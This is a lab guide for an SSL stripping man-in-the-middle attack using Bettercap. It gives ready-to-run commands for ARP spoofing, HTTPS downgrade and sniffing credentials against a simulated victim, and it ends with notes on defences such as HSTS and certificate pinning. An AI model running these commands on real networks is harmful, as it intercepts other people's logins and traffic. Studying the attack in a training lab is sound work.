# SSL Stripping Lab Guide

## Overview
This lab demonstrates SSL downgrade attacks using SSL stripping techniques. The goal is to intercept HTTPS traffic and capture credentials transmitted in plaintext for security research and defense training.

## Prerequisites
- Linux system with network access
- Bettercap installed
- Python 3 with requests library
- Network interface capable of packet injection
- Victim simulator (included)

## Tools Comparison

### Bettercap vs Ettercap
- **Bettercap**: Recommended - built-in SSL stripping, no custom filters needed
- **Ettercap**: Requires custom filter files, more complex setup

## Lab Setup

### 1. Install Bettercap
```bash
sudo apt install bettercap
```

### 2. Enable IP Forwarding
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
```

### 3. Start SSL Stripping Attack

**Basic command (replace `eth0` with your interface):**
```bash
sudo bettercap -iface eth0 -eval "net.recon on; set arp.spoof.fullduplex true; arp.spoof on; set http.proxy.sslstrip true; http.proxy on; net.sniff on"
```

**Target specific victim:**
```bash
sudo bettercap -iface eth0 -eval "set arp.spoof.fullduplex true; set arp.spoof.targets [VICTIM_IP]; arp.spoof on; set http.proxy.sslstrip true; http.proxy on; net.sniff on"
```

### 4. Run Victim Simulator
In a separate terminal:
```bash
python3 victim_simulator.py
```

## Attack Components

### Bettercap Modules Used
- `arp.spoof`: ARP poisoning for MITM positioning
- `http.proxy`: HTTP proxy with SSL stripping
- `net.sniff`: Packet capture for credential extraction
- `net.recon`: Network reconnaissance

### SSL Stripping Process
1. ARP spoofing positions attacker as gateway
2. HTTPS requests intercepted and downgraded to HTTP
3. Victim receives HTTP response (appears normal)
4. Credentials transmitted in plaintext
5. Bettercap captures and logs credentials

## Expected Results

### Captured Credentials
Monitor bettercap output for POST data containing:
- `username=Employee@sinamoa.com`
- `password=Employee123!@#`
- `csrf_token=dummy_token`

### Traffic Flow
1. Victim attempts HTTPS connection to port 3000
2. Bettercap intercepts and strips SSL
3. Plaintext HTTP request sent to server
4. Credentials captured in transit

## Victim Simulator Details
- Sends login attempts every 30 seconds
- Uses realistic User-Agent headers
- Targets configurable IP address
- Simulates typical web application login flow

## Defense Considerations
This lab helps understand:
- SSL stripping attack vectors
- Importance of HSTS (HTTP Strict Transport Security)
- Certificate pinning effectiveness
- User awareness of URL schemes (HTTP vs HTTPS)

## Lab Cleanup
1. Stop bettercap with Ctrl+C
2. Stop victim simulator with Ctrl+C
3. Disable IP forwarding (optional):
   ```bash
   echo 0 > /proc/sys/net/ipv4/ip_forward
   ```

## Notes
- This setup requires no custom configuration files
- Works out of the box with standard tools
- Demonstrates practical SSL downgrade vulnerability
- Suitable for security research and training environments

## Troubleshooting
- Ensure proper network interface selection
- Verify ARP spoofing is working with `net.show`
- Check that victim and attacker are on same network segment
- Monitor bettercap logs for SSL stripping activity